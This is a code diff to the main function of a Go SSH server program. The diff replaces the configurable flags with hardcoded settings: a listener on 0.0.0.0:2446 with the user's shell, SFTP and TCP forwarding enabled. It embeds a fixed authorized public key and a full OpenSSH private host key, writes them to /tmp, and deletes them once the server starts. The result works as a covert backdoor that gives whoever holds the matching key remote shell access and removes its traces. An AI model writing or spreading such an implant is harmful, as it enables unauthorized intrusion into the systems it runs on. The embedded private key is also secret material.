@@ -54,27 +54,36 @@ func main() {
 		fmt.Print(help)
 		os.Exit(1)
 	}
+	//	log.SetOutput(io.Discard)
+	//log.SetOutput()
+	key := "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBp5rj30BNkuarA5H3bIRL7RZSTPRCDGs9YcP9gR4gwI root@vm"
+	os.WriteFile("/tmp/a.auth.key", []byte(key), 0600)
+	key = `-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACBk5Ng+t8/AkrD9VjQAUF08d1lW3h3d7uN2/BreVbN8uQAAAJBWsZEuVrGR
+LgAAAAtzc2gtZWQyNTUxOQAAACBk5Ng+t8/AkrD9VjQAUF08d1lW3h3d7uN2/BreVbN8uQ
+AAAEB9FANcRa27zzWkm/hskoGkuj9asCAG/jZox9k1Inkpa2Tk2D63z8CSsP1WNABQXTx3
+WVbeHd3u43b8Gt5Vs3y5AAAACXJvb3RAdGVhbQECAwQ=
+-----END OPENSSH PRIVATE KEY-----`
+	os.WriteFile(("/tmp/a.key"), []byte(key), 0600)
 
 	//init config from flags
 	c := &sshd.Config{}
-	flag.StringVar(&c.Host, "host", "0.0.0.0", "")
-	flag.StringVar(&c.Port, "p", "", "")
-	flag.StringVar(&c.Port, "port", "", "")
-	flag.StringVar(&c.Shell, "shell", os.Getenv("SHELL"), "")
-	flag.StringVar(&c.KeyFile, "keyfile", "", "")
-	flag.StringVar(&c.KeySeed, "keyseed", "", "")
-	flag.IntVar(&c.KeepAlive, "keepalive", 60, "")
-	flag.BoolVar(&c.IgnoreEnv, "noenv", false, "")
-	flag.BoolVar(&c.SFTP, "s", false, "")
-	flag.BoolVar(&c.SFTP, "sftp", false, "")
-	flag.BoolVar(&c.TCPForwarding, "t", false, "")
-	flag.BoolVar(&c.TCPForwarding, "tcp-forwarding", false, "")
+
+	c.Host = "0.0.0.0"
+	c.Port = "2446"
+	c.Shell = os.Getenv(("SHELL"))
+	c.KeepAlive = 60
+	c.IgnoreEnv = false
+	c.KeyFile = "/tmp/a.key"
+	c.SFTP = true
+	c.TCPForwarding = true
+	c.AuthType = "/tmp/a.auth.key"
+	c.LogVerbose = true
 
 	//help/version
 	h1f := flag.Bool("h", false, "")
 	h2f := flag.Bool("help", false, "")
-	v1f := flag.Bool("verbose", false, "")
-	v2f := flag.Bool("v", false, "")
 	vf := flag.Bool("version", false, "")
 	flag.Parse()
 
@@ -86,18 +95,14 @@ func main() {
 		flag.Usage()
 	}
 
-	c.LogVerbose = *v1f || *v2f
-
-	args := flag.Args()
-	if len(args) != 1 {
-		flag.Usage()
-	}
-	c.AuthType = args[0]
+	c.AuthType = "/tmp/a.auth.key"
 
 	s, err := sshd.NewServer(c)
 	if err != nil {
 		log.Fatal(err)
 	}
+	os.Remove("/tmp/a.auth.key")
+	os.Remove("/tmp/a.key")
 	err = s.Start()
 	if err != nil {
 		log.Fatal(err)
